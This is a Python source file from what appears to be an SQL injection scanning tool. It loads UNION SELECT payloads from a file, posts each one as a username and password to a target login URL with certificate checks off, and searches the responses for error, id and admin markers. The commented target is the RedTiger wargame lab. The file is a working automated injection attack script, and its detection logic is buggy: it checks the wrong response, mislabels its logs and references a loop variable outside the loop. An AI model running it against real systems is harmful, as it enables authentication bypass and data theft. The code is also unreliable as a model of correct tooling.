import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import socket
import sqlite3
import logging
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import safe_SQLJNG_result
from lib.result.Results import SQLJNG_result_report
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response
from lib.Attacktype.Attacks import AttackType 
from logger.sqljlog import logger as sqljlog


attack_type = "Union Select injection"


pattern = r"\berror\b"
htmlpattern = r"\bid\b"
UNIOn_capture = []


""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""





async def union_based_SQL_inj(urls):
    """UNION SELECT is a technique used in SQL injection attacks to combine the results of two or more SELECT statements into a single result set. """
    """This attack is when we inject some malicious code to the database and extract some code out of it. """
    try:
        global pattern,htmlpattern
        done = False
        filename = "UnionselectInj.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls } \n Do you want to send the payload to the website according to the above payload? ")
                logger.info(f"Host is up with the status code: {req.status_code}")
                
                if ask.lower() == "y":
                    sqljlog.info(f"Testing:{AttackType.UNION_BASED_SQL_INJECTION.value}")
                    for line in sorted_payload.split("\n"):
                        sqljlog.info(f"Testing:{line if len(line) <50 else line.split("\n")}")

                        params = {
                            "username": line,
                            "password": line
                        }
                        ack = requests.post(url=urls, data=params,verify=False)
                        logger.info(f"Sending payload {line}")
                        await asyncio.sleep(5)
                        logging.info(f"Sending payload:{line} to the website:{urls},attack:{attack_type},time:{datetime.now()}")
                        if "error" in ack.text:
                            logger.info(f"Could find parameter Error,keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            html_response.push(ack.text)
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE)
                        if vuln:
                            logger.info(f"Could find id parameter, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                            html_response.push(ack.text)

                            
                        
                        if htmlVULN:
                            logger.info(f"Could find Error parameter, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                            html_response.push(ack.text)

                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            logger.info(f"Could find parameter id, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                            html_response.push(ack.text)

                        
                        if errword:
                            logger.info(f"Could find parameter error, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                            html_response.push(ack.text)

                            
                        
                            
                    if ack.status_code == 302:
                        print(f"[{datetime.now()}]","|[INFO]Could inject the injectable are to the website,keyword:|",params["username"],"|Attack:|",attack_type)
                        logging.info(f"Could inject the injectable are to the website,keyword:{params['username']},Time:{datetime.now()},attack:{attack_type}")
                        done = True
                        
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        logger.info(f"Could find parameter admin,keyword:{line},target:{urls}")
                        Detect(ack.text)
                        html_response.push(ack.text)

                        
                elif ack.status_code == 200:
                    logger.info(f"Could find parameter admin,keyword:{line},target:{urls}")
                        
                else:
                    pass
                        
            else:
                logger.info(f"Could not connect to the target:{urls} in the time:{datetime.now()}")
        

        
    except KeyboardInterrupt:
        logger.info("Aborted by keyboard interrupt")
        
    except UnboundLocalError:
        pass
    
    except Exception as e:
        logger.error(f"Error: {e}")        
        

        

    
 
        
    finally:
        logger.info("Done")
        try:
            await SQLJNG_result_report(html_response)

        except SQLJNGStackRangeError:
            result = safe_SQLJNG_result(html_response)
            for res in result:
                logger.info(res)

        
                
# asyncio.run(union_based_SQL_inj("https://redtiger.labs.overthewire.org/level1.php"))
